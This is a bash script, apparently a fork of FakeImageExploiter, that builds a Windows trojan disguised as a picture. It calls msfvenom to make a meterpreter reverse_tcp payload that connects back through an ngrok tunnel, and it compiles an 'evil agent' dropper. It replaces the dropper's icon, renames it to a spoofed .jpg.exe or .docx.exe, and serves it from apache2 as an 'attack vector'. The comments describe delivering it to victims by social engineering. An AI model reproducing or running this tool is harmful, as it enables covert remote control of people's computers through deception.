#!/bin/sh

clear
rm -rf ./output
rm -rf ./WH-output
sleep 1;
mkdir ./output
mkdir ./WH-output
RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;
echo " Image exploit > Power by > ${GREEN} FakeImageExploiter tool${RESTORE} "
echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"
sleep 1.2;

#
# FakeImageExploiter v1.4 - agent.jpg.exe
# Version: v1.4 (Stable)
# CodeName: Metamorphosis
# Author: pedro ubuntu [ r00t-3xp10it ]
# Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
#
# Description:
#   This module takes one existing image.jpg and one payload.ps1 (input by user) and
#   builds a new payload (agent.jpg.exe) that if executed it will trigger the download
#   of the 2 previous files stored into apache2 webserver (image.jpg + payload.ps1).
#   This module also changes the payload Icon to match the input image.jpg Then uses
#   'hides known file extensions' to hidde the .exe extension (final: agent.jpg.exe) ..
#
# Exploitation:
#   agent.jpg.exe final binary should be deliver to target using social enginnering
#   (apache2) As soon as the victim runs our executable, our picture will be downloaded
#   and opened in the default picture viewer, our malicious payload will be executed,
#   and we will get a meterpreter session.
#
# 'This tool also builds a cleaner.rc file to delete payloads left in target'
# Credits: https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-picture-0168183
##
# resize terminal window [ milton@barra ] ..
#resize -s 22 92 > /dev/null



#
# Colorise shell Script output leters
#
Colors() {
Escape="";
  whitew1="";
  RedFr1="";
  GreenFg1="";
  YellowFy1="";
  BlueFb1="";
  CyanFc1="";
Resetr1="";
}



#
# Framework variable declarations
#
VeR="1.3" # Framework version
ArCh=`arch` # store attackers system arch
IPATH=`pwd` # store Framework full path
HoME=`echo ~` # store home variable
CnA="Metamorphosis" # Framework codename display
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution (Ubuntu | Kali | parrot)
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use (wlan0 | eth0)
HkLm=`cat $HoME/.wine/system.reg | egrep -m 1 'ProductName' | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1 # wine windows version
#
# Read options (configurations) from settings_ic file ..
#
bYR=`cat $IPATH/settings_ic | egrep -m 1 "BYPASS_RH" | cut -d '=' -f2` > /dev/null 2>&1 # bypass resource hacker funtion?
EtU=`cat $IPATH/settings_ic | egrep -m 1 "PICTURE_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1 # store extension to use
#PaLe=`cat $IPATH/settings_ic | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1 # store extension to use
PaLe=`exe` > /dev/null 2>&1 # store extension to use

ApAc=`cat $IPATH/settings_ic | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1 # store apache2 webroot
NoMsF=`cat $IPATH/settings_ic | egrep -m 1 "NON_MSF_PAYLOADS" | cut -d '=' -f2` > /dev/null 2>&1 # stored from settings_ic file
AuTo=`NO` > /dev/null 2>&1 # stored from settings_ic file
AhPu=`cat $IPATH/settings_ic | egrep -m 1 "AGENT_HANDLER_PORT" | cut -d '=' -f2` > /dev/null 2>&1 # Agent/handler port
FwDc=`cat $IPATH/settings_ic | egrep -m 1 "FAKE_WORD_DOC" | cut -d '=' -f2` > /dev/null 2>&1 # fake word doc builder
PuIa=`cat $IPATH/settings_ic | egrep -m 1 "USE_PUBLIC_IP" | cut -d '=' -f2` > /dev/null 2>&1 # Use public ip addr?
PuiB=`cat $IPATH/settings_ic | egrep -m 1 "EXTERNAL_IP" | cut -d '=' -f2` > /dev/null 2>&1 # Use public ip addr?
ChEk=`cat $IPATH/settings_ic | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1 # rebuild metasploit db?


#
# Config user system correct arch
#
if [ "$ArCh" = "i686" ]; then
  dEd="x86"
  arch="wine"
  PgFi="Program Files"
  ComP="i586-mingw32msvc-gcc"
else
  dEd="x86"
  arch="wine"
  PgFi="Program Files"
  ComP="i586-mingw32msvc-gcc"
  # dEd="x64"
  # arch="wine64"
  # PgFi="Program Files (x86)" # default value
  # PgFi="Program Files"
  # ComP="i686-w64-mingw32-gcc"
fi
#
# Resource hacker install path (local)
#
RhI="$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"



#
# Grab Ip address to config apache2 URL and evil agent download URL
#
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | awk {'print $1'}`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear



#
# Use your public ip addr to deliver payloads over wan ..
#
if [ "$PuIa" = "YES" ]; then
IP="$PuiB"
fi



#
# Check for dependencies Installed ..
# xterm, zenity, apache2, mingw32[64], ResourceHacker(wine)
#
Colors;
echo ${BlueFb1}[☆]${whitew1} Checking backend applications ..${Resetr1};
sleep 1
#
# search for mingw32[64] intallation ..
# i586-mingw32msvc-gcc OR i686-w64-mingw32-gcc
# 
apc=`which $ComP`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedFr1}[x]${whitew1} mingw32[64] installation '->' not found!${Resetr1};
  sleep 1
  echo ${RedFr1}[x]${whitew1} This script requires mingw32[64] to work${Resetr1};
  echo ${YellowFy1}[☆] Please wait: installing missing dependencies ..${Resetr1};
    #
    # Installing the correct arch GCC compiller
    #
    if [ "$dEd" = "x86" ]; then
      echo ""
      sudo apt-get install mingw32
      echo ""
    else
      echo ""
      sudo dpkg --add-architecture i386 && apt-get update && apt-get -y dist-upgrade --allow-downgrades && apt-get install -y mingw32 i586-mingw32msvc-gcc mingw-w64
      echo ""
    fi
else
  echo ${BlueFb1}[☆]${whitew1}" mingw32 installation : ${GreenFg1}found!"${Resetr1};
  sleep 1
fi

# search for wine intallation ..
apc=`which wine`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedFr1}[x]${whitew1} Wine installation '->' not found!${Resetr1};
  sleep 1
  echo ${RedFr1}[x]${whitew1} This script requires wine to work${Resetr1};
  echo ${YellowFy1}[☆] Please wait: installing missing dependencies ..${Resetr1};
  echo ""
  sudo apt-get install wine
  echo ""
else
  echo ${BlueFb1}[☆]${whitew1}" Wine installation    : ${GreenFg1}found!"${Resetr1};
  sleep 1
fi

# search for xterm intallation ..
apc=`which xterm`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedFr1}[x]${whitew1} Xterm installation '->' not found!${Resetr1};
  sleep 1
  echo ${RedFr1}[x]${whitew1} This script requires xterm to work!${Resetr1};
  echo ${YellowFy1}[☆] Please wait: installing missing dependencies ..${Resetr1};
  echo ""
  sudo apt-get install xterm
  echo ""
else
  echo ${BlueFb1}[☆]${whitew1}" Xterm installation   : ${GreenFg1}found!"${Resetr1};
  sleep 1
fi

# search for zenity intallation ..
apc=`which zenity`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedFr1}[x]${whitew1} Zenity installation '->' not found!${Resetr1};
  sleep 1
  echo ${RedFr1}[x]${whitew1} This script requires Zenity to work!${Resetr1};
  echo ${YellowFy1}[☆] Please wait: installing missing dependencies ..${Resetr1};
  echo ""
  sudo apt-get install zenity
  echo ""
else
  echo ${BlueFb1}[☆]${whitew1}" Zenity installation  : ${GreenFg1}found!"${Resetr1};
  sleep 1
fi

# search for: '.wine/drive_c/Program Files' folder ..
if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
  echo ${BlueFb1}[☆]${whitew1}" Wine $PgFi   : ${GreenFg1}found!"${Resetr1};
  sleep 1
else
  FaIl="YES"
  echo ${RedFr1}[x]${whitew1} Wine: $PgFi '->' not found!${Resetr1};
  sleep 2
  echo ${GreenFg1}[☆]${whitew1} Please wait, trying to build required folders ..!${Resetr1};
  winecfg > /dev/null 2>&1
  echo ""
  echo ${RedFr1}Listing drive_c directorys: ${Resetr1};
  ls $HoME/.wine/drive_c
  echo ""
fi



#
# Restart tool after dependencies installs (FaIl="YES")
#
if [ "$FaIl" = "YES" ]; then
  sleep 3
  echo ${YellowFy1}[☆] FakeImageExploiter needs to restart to finish installs ..${Resetr1};
  sleep 2
  exit
fi



#
# Config WINE windows version (if not supported) ..
#
if ! [ "$HkLm" = "Microsoft Windows 7" ]; then
  echo ${RedFr1}[x]${whitew1} Wine system detected : ${RedFr1}$HkLm ${Resetr1};
  echo ${RedFr1}[x]${whitew1} FakeImageExploiter requires: ${GreenFg1}windows 7${whitew1} version ..${Resetr1};
  echo ${YellowFy1}[☆] Starting winecfg, Please sellect required version ..${Resetr1};
  sleep 1
  winecfg > /dev/null 2>&1
fi



#
# 1º BANNER DISPLAY (run or abort)
# HINT: This will give users the chance to abort tool
# execution, edit 'settings_ic' file to use a diferent extension ..
#
clear

clear
RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;
echo " Image exploit > Power by > ${GREEN} FakeImageExploiter tool${RESTORE} "
echo " Extension sellected: .$EtU (picture) "
echo " Extension sellected: .$PaLe (payload) "
 
echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"
  #=================22==================

	xterm -hold -T "Hacker-Exploit-V2" -e "proxychains $IPATH/ngrok tcp 8080" &
	sleep 2.55;
	
	echo " EXAMPLE :  tcp://${GREEN}0.tcp.ngrok.io${RESTORE}:${YELLOW}18326 ${RESTORE}-> localhost:8080 "
	echo " EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your tcp lhost and ${YELLOW}Yellow${RESTORE} color is your current LPORT ) "

	
	echo "${RESTORE}"

	echo " please input your current NGROK URL "
	read -p ' HE :~' NGWIPA
echo ""
	echo " please input your NGROK TCP Port number "
	read -p ' HE :~ ' WNGPORT

	

	xterm -hold -T "Hacker-Exploit-V2 > PAYLOAD SHEAR WITH NGROK URL " -e "$IPATH/ngrok http -region eu 80" &
	sleep 2.55;
	echo " EXAMPLE :  http://${GREEN}3X4mpu13.ngrok.io${RESTORE}:${YELLOW}-> http://localhost:8080  ${RESTORE} "
	echo " EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your HTTP Connection and ${YELLOW}Yellow${RESTORE} color is your Local Connection ) "

	echo " please input your || [ exampul:Green ] NGROK HTTP URL "
	read -p ' HE :~ ' NGHTTPWH


echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
echo "${YELLOW}[*] MSFVEMON  windows/meterpreter/reverse_tcp > Payload generating >  Start . ${GREEN} DONE${RESTORE} "

sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=0.tcp.ngrok.io LPORT=$WNGPORT -b "\x00" -f exe -o $IPATH/WHPAYLOADNAME.exe
sleep 1;

#====================22====================
# Chose to run or to abort framework execution ..
# IF decided to run, start requiered services ..
#
rUn=$(zenity --question --title="☠ HackerExploiit v2 > F.I.E. ☠" --text "Execute framework?" --width 270) > /dev/null 2>&1
#
# check if settings_ic file its proper configurated
#
if [ "$PaLe" = "exe" ] && [ "$AuTo" = "YES" ]; then
  echo ${RedFr1}[x]${YellowFy1} "[settings_ic] AUTO_PAYLOAD_BUILD=${RedFr1}$AuTo${YellowFy1} and PAYLOAD_EXTENSION=${RedFr1}$PaLe"${Resetr1};
  sleep 2
  echo ${RedFr1}[x]${YellowFy1} "Can ${RedFr1}NOT${YellowFy1} be used simultaneously, AUTO_PAYLOAD_BUILD does not build .exe binarys."${Resetr1};
  exit
fi

  if [ "$?" -eq "0" ]; then
    service apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    # read NON-METASPLOIT payloads conf in 'settings_ic' file ..
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start Metasploit services" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      #
      # rebuild msfdb ? (check settings_ic file)
      # 
      if [ "$ChEk" = "ON" ]; then
        #
        # start msfconsole to check postgresql connection status
        #
        service postgresql start
        echo ${BlueFb1}[☆]${whitew1}" Checking msfdb connection status .."${Resetr1};
        ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
          if [ "$ih" != "connected" ]; then
            echo ${RedFr1}[x]${whitew1}" postgresql selected, no connection .."${Resetr1};
            echo ${BlueFb1}[☆]${whitew1}" Please wait, rebuilding msf database .."${Resetr1};
            # rebuild msf database (database.yml)
            msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
            echo ${GreenFg1}[✔]${whitew1}" postgresql connected to msf .."${Resetr1};
            sleep 2
          else
            echo ${GreenFg1}[✔]${whitew1}" postgresql connected to msf .."${Resetr1};
            sleep 2
          fi
      fi
    fi

  else

    clear
    echo ""
    # Abort tool execution, lets chose another extension to use ..
    echo ${whitew1}    Codename${RedFr1}::${whitew1}$CnA ${Resetr1};
    echo ${whitew1}    Author${RedFr1}::${whitew1}pedr0 ubuntu${RedFr1}::${whitew1}[r00t-3xp10it]${Resetr1};
    echo ${whitew1}    FakeImageExploiter${RedFr1}::${whitew1}v$VeR${RedFr1}::${whitew1}SuspiciousShellActivity©${RedFr1}::${whitew1}RedTeam${RedFr1}::${whitew1}2017${Resetr1};
    echo ""
    # Stoping all services ..
    service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    if ! [ "$NoMsF" = "YES" ]; then
    service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    fi
    exit
  fi


#
# START OF THE 'REAL' FUNTIONS, Questions to user (zenity)
#
if [ "$AuTo" = "YES" ]; then
  #
  # AUTO_PAYLOAD_BUILD=YES (settings_ic file conf) ..
  # WARNING: This funtion only works if active in settings_ic file ..
  #
  paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1
  xterm -T " Hacker Exploit v2 > F.I.E. - build payload: .$PaLe " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$IP LPORT=$AhPu -f psh-cmd -o $IPATH/output/chars.raw" > /dev/null 2>&1
  # Inject shellcode into payload.ps1
  cd $IPATH/output
  str0=`cat chars.raw | awk {'print $12'}`
  echo "pOwErShElL -noP -wIN 1 -nOnI -eN Sh33L" > payload.raw
  sed "s|Sh33L|$str0|" payload.raw > payload.$PaLe
  # Delete old conf files ..
  rm payload.raw > /dev/null 2>&1
  rm chars.raw > /dev/null 2>&1
  cd $IPATH
else
# Orginal payload full-path variable

#===11===============================================================#



UpL=$IPATH/WHPAYLOADNAME.exe > /dev/null 2>&1

#========11=======================
fi
sleep 1
# Orginal image.jpg full-path variable
JpG=$(zenity --title "☠ IMAGE TO BE USED (only .$EtU) ☠" --filename=$IPATH --file-selection --text "chose image to use.") > /dev/null 2>&1
sleep 1

#
# IF: FAKE_WORD_DOC=YES
# 
if [ "$FwDc" = "YES" ]; then
PaTh="$IPATH/icons/Microsoft-Word.ico"
else
  #
  # Icon to use in agent.jpg.exe (RH auto-replacement)
  # HINT: zenity displays will be based on picture inputed extension ..
  #
  if [ "$EtU" = "jpg" ]; then
  IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-black.ico" FALSE "JPG-whitew1.ico" FALSE "JPG-green.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  elif [ "$EtU" = "jpeg" ]; then
  IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPEG-black.ico" FALSE "JPEG-whitew1.ico" FALSE "JPEG-orange.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  elif [ "$EtU" = "png" ]; then
  IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "PNG-black.ico" FALSE "PNG-whitew1.ico" FALSE "PNG-simple.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  else
  # I dont recognise the extension (picture) input by user ..
  IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-Ios7.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" FALSE "Input your own icon" --width 330 --height 240) > /dev/null 2>&1
  fi
  #
  # User have decided to input is own icon.ico file ..
  # So, were is it ? (your icon.ico full path?) ..
  #
  if [ "$IcOn" = "Input your own icon" ]; then
    ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
    PaTh="$ImR"
  else
    PaTh="$IPATH/icons/$IcOn"
  fi
fi
sleep 1
# Rename your agent (name.jpg.exe) ..
MiP=$(zenity --title "☠ PAYLOAD FINAL NAME ☠" --text "example: screenshot" --entry --width 300) > /dev/null 2>&1
clear

clear
RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;
echo " Image exploit > Power by > ${GREEN} FakeImageExploiter tool${RESTORE} "
echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"
#
# Build/config evil agent C binary
# HINT: In reallity we are just using SED to config it ..
#
cd $IPATH/bin
echo ${BlueFb1}[☆]${whitew1} Building : evil agent ..${Resetr1};
  #
  # If binary extension = exe then compile evil2.C [mascerano fix]
  #
  if [ "$PaLe" = "exe" ]; then
    sed "s|LhOsT|$IP|g" evil2.c > evilcopy.c
    sed -i "s|ScRee|$MiP.$EtU|g" evilcopy.c
    sed -i "s|EhLh|$PaLe|g" evilcopy.c
    sleep 2
  else
    sed "s|LhOsT|$IP|g" evil.c > evilcopy.c
    sed -i "s|ScRee|$MiP.$EtU|g" evilcopy.c
    sed -i "s|EhLh|$PaLe|g" evilcopy.c
    sleep 2
  fi



#
# Compiling agent using mingw32[64] (gcc)
# WARNING: this funtion only compiles 32bites payloads
# GCC    : i586-mingw32msvc-gcc OR i686-w64-mingw32-gcc
#
echo ${BlueFb1}[☆]${whitew1} Compiling: agent using mingw32 ..${Resetr1};
sleep 2
$ComP evilcopy.c -o trigger.exe -lws2_32 -mwindows
mv trigger.exe $IPATH/output/trigger.exe > /dev/null 2>&1
cd $IPATH



#
# Run or abort ResourceHacker usage (BYPASS_RH=YES)
# This funtion allow you to use another editor to change icons ..
#
if [ "$bYR" = "YES" ]; then
  echo ${YellowFy1}[☆]${whitew1} Manually change icon.ico sellected ..${Resetr1};
  echo ${YellowFy1}[☆]${whitew1} Use your favorite editor to change icon [trigger.exe]${Resetr1};
  echo ${YellowFy1}[☠] When finish, press any key to Continue ..${Resetr1};
  # Waiting for you to finish (read op) ..
  read op
  # Now, port the metamorphosis agent to output folder ..
  mv $IPATH/output/trigger.exe $IPATH/output/agent.exe > /dev/null 2>&1

else

  #
  # Check for resource hacker installation (wine)
  # Iam paranoic you know? i like to check twice just in case :D
  #
  if [ -f "$RhI" ]; then
    echo ${BlueFb1}[☆]${whitew1} ResourceHacker.exe: found ..${Resetr1};
    sleep 1
    #
    # Wine command to call resourcehacker and add an icon.ico to the 'agent.exe'
    #
    echo ${BlueFb1}[☆]${whitew1} Working: In backdoor agent ..${Resetr1};
    $arch "$RhI" -open "$IPATH/output/trigger.exe" -save "$IPATH/output/agent.exe" -action addskip -res "$PaTh" -mask ICONGROUP,MAINICON,
    echo ${BlueFb1}[☆]${whitew1} Change : backdoor agent icons ..${Resetr1};
    sleep 1

  else

    #
    # Resource-Hacker Installation under WINE (the problem beggings) ..
    # Lets hope everything its proper config before running this funtion ..
    # OR this funtion will enter into a loop, unless (BYPASS_RH=YES) its active in settings_ic file.
    #
    echo ${RedFr1}[x]${whitew1} ResourceHacker.exe '->' not found!${Resetr1};
    sleep 1
cat << !

    Installing ResourceHacker under .wine directorys ..
    Version:$HkLm Arch:$dEd Folder:$PgFi
    PATH:$RhI

!
    sleep 3
    # Installing Resource-Hacker.exe under wine ..
    xterm -T "Hacker Exploit v2 > F.I.E." -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
    echo ${YellowFy1}[☆] Please wait, restarting tool ..${Resetr1};
    echo ${YellowFy1}[☆] For proper ResourceHacker.exe Instalation!${Resetr1};
    sleep 2
    exit

  fi
fi



  #
  # Change agent extension (spoof extension)
  # TODO: Downside of RTLO, only last six caracters will be spoofed [no jpeg]
  #
  echo ${BlueFb1}[☆]${whitew1} Change : backdoor agent extension ..${Resetr1};
  mv $IPATH/output/agent.exe  $IPATH/output/$MiP.$EtU.exe > /dev/null 2>&1
  sleep 2


    #
    # Port to apache2 all files (zip agent.jpg.exe)
    #
    echo ${BlueFb1}[☆]${whitew1} Port: all files to apache2 webserver ..${Resetr1};
      #
      # IF: AUTO_PAYLOAD_BUILD=YES
      # Then port FakeImageExploiter build (payload.ps1) to apache2 ..
      #
      if [ "$AuTo" = "YES" ]; then
        cp $IPATH/output/payload.$PaLe $ApAc/payload.$PaLe > /dev/null 2>&1
      else      
        cp $UpL $ApAc/payload.$PaLe > /dev/null 2>&1
      fi

    cp $JpG $ApAc/$MiP.$EtU > /dev/null 2>&1
    sleep 2
    echo ${BlueFb1}[☆]${whitew1} Creating: archive $MiP.zip ..${Resetr1};
    cd $IPATH/output
    # IF: FAKE_WORD_DOC=YES
    if [ "$FwDc" = "YES" ]; then
      # Zip it (to apache2 webserver delivery) ..
      mv $MiP.$EtU.exe $MiP.docx.exe > /dev/null 2>&1
      zip $MiP.zip $MiP.docx.exe > /dev/null 2>&1
      mv $MiP.zip $ApAc/$MiP.zip > /dev/null 2>&1
    else
      # Zip it (to apache2 webserver delivery) ..
      zip $MiP.zip $MiP.$EtU.exe > /dev/null 2>&1
      mv $MiP.zip $ApAc/$MiP.zip > /dev/null 2>&1
    fi
    cd $IPATH
    sleep 2


    #
    # Use your own binary (NON_MSF_PAYLOADS=YES)
    # WARNING: You need to start your own handler to recibe the connection ..
    # WARNING: If this funtion is active, then we will not build the cleaner.rc ..
    # WARNING: This funtion will NOT work together with (AUTO_PAYLOAD_BUILD=YES) ..
    #
    if [ "$NoMsF" = "YES" ]; then
      echo ${BlueFb1}[☠]${whitew1} Metamorphosis: completed ..${Resetr1};
      sleep 2
      echo ${YellowFy1}[☠] Start your own handler now '(listener)' ..${Resetr1};
      sleep 2
      # Clean stuff (old config files)
      rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
      rm $IPATH/output/trigger.exe > /dev/null 2>&1
      # Attack vector (apache2 webserver)
      echo ""
      echo ${RedFr1}"    ATTACK VECTOR: ${GREEN} http://$IP/$MiP.zip"${Resetr1} ${RESTORE};
      echo ${RedFr1}"    AGENT: $IPATH/output/$MiP.$EtU.exe"${Resetr1};
      echo ""
      sleep 1
      echo ${YellowFy1}[☠] When finish, press any key to Exit FakeImageExploiter ..${Resetr1};
      # Waiting for you to finish (read op) ..
      read op

    else

      #
      # Build cleanner resource file (cleaner.rc)
      # WARNING: This RC file must be called manually from meterpreter prompt
      #
      echo ${BlueFb1}[☆]${whitew1} Creating: resource cleaner.rc ..${Resetr1};
      sleep 2
      cd $IPATH/bin
      #
      # If binary extension = exe then use cleaner2.rc
      # This cleaner.rc will delete payload.ps1 and picture.jpg ..
      #
      if [ "$PaLe" = "exe" ]; then
        sed "s|RffR|$PaLe|g" cleaner2.rc > copy.rc
        sed -i "s|FaaF|$MiP|g" copy.rc
        sed -i "s|AssA|$EtU|g" copy.rc
        mv copy.rc $IPATH/output/cleaner.rc > /dev/null 2>&1
        cd $IPATH
      else
        #
        # This cleaner.rc only deletes picture.jpg from target ..
        # Because all non-exe payloads will be executed in target RAM (dont touch disk).
        #
        sed "s|FaaF|$MiP|g" cleaner.rc > copy.rc
        sed -i "s|AssA|$EtU|g" copy.rc
        mv copy.rc $IPATH/output/cleaner.rc > /dev/null 2>&1
        cd $IPATH
      fi


        #
        # Start metasploit multi-handler ..
        # WARNING: agent.jpg.exe will be ziped (zip) for apache2 use, because
        # it raises less suspicious to use an URL http://IP/image.zip that
        # use URL http://IP/image.jpg.exe to deliver payload using apache2
        #
        echo ${BlueFb1}[☠]${whitew1} Metamorphosis: completed ..${Resetr1};
        rm $IPATH/output/trigger.exe > /dev/null 2>&1
        sleep 2
